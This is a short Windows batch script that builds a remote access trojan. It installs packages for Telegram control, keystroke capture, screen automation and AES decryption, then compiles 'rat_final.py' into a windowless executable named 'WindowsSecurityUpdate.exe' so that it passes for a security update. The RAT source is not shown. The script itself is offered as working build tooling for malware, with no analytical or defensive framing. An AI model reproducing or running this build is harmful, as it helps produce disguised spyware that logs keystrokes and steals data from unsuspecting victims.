@echo off
chcp 65001 >nul
title RAT Compilation

echo [1/3] Installing required packages...
pip install pytelegrambotapi==4.14.0 psutil==5.9.5 pyautogui==0.9.54 pywin32==305 requests==2.31.0 pycryptodome==3.18.0 pynput==1.7.6

echo [2/3] Installing PyInstaller...
pip install pyinstaller

echo [3/3] Compiling to EXE...
pyinstaller --onefile --noconsole --name "WindowsSecurityUpdate.exe" ^
--hidden-import=telebot ^
--hidden-import=psutil ^
--hidden-import=pyautogui ^
--hidden-import=win32api ^
--hidden-import=win32con ^
--hidden-import=win32gui ^
--hidden-import=Crypto.Cipher.AES ^
--hidden-import=Crypto.Util.Padding ^
--hidden-import=sqlite3 ^
--hidden-import=pynput.keyboard ^
--icon=NONE ^
rat_final.py

echo [SUCCESS] Build completed: dist/WindowsSecurityUpdate.exe
pause